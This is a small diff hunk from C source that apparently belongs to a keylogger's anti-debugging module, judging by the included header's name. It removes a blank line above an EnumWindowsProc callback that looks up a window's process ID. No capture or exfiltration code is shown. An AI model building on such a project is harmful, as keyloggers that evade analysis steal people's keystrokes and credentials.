@@ -1,7 +1,6 @@
 #include "keylogger_antidebugg.h"
 #include <Windows.h>
 
-
 BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
     DWORD dwProcessId;
     GetWindowThreadProcessId(hwnd, &dwProcessId);
